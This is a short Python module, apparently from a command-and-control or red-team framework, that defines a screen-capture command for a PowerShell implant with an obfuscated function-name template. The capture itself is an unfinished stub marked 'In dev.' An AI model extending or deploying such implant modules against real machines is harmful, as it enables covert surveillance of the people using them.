
class ScreenCapture:
    type = "SC"
    args = "base64 target file"
    input = "screenshot"

    def process_implant_response(self, data, args):
        return "Screen capture: In dev.", None

    def implant_text(self):
        var = '''
function {{ ron.obf_screen_capture }} ($b){
    try {
        $global:tr = "1"
    } catch {
        $global:tr = "0"
    }
}'''
        return var
